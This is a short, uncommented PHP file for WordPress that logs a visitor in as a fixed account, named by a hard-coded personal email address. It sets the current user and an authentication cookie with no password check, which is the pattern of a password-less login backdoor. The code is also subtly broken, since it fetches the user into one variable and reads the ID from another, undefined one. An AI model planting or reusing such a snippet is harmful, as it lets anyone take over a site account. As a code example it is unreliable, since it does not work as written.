<?php 

  $userDetail = get_user_by('email', 'gulshan.webchefz@gmail.com');
  $userID = $user->ID;
  wp_set_current_user($userID, 'gulshan.webchefz@gmail.com');
  wp_set_auth_cookie($userID);
  do_action('wp_login', 'gulshan.webchefz@gmail.com');





  


